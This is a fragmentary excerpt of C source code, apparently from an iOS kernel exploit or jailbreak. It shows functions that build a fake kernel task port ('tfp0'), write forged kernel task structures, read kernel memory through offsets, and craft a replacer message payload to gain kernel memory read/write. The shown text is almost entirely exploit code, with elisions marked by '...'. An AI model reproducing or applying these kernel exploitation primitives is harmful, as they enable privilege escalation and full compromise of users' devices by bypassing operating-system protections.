...
mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space)
{
    ...
    *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    wkbuffer(fake_kernel_task_kaddr, (void *)fake_kernel_task, 0x1000);
...
#define IE_BITS_RECEIVE (1 << 17)
    ...
    LOG(ADDR, *(uint64_t*)data_out);
    LOG(ADDR, *(uint64_t*)(data_out + 8));
    LOG(ADDR, *(uint64_t*)(data_out + 0x10));
    LOG(ADDR, *(uint64_t*)(data_out + 0x18));
...
mach_port_t get_kernel_memory_rw()
{
    ...
    uint64_t ipc_space = ReadKernel64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (ipc_space == 0) {
        return MACH_PORT_NULL;
    }
    replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space, &context_ptr);
    if (replacer_message_body == NULL) {
        return MACH_PORT_NULL;
    }
    ...
    mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space);
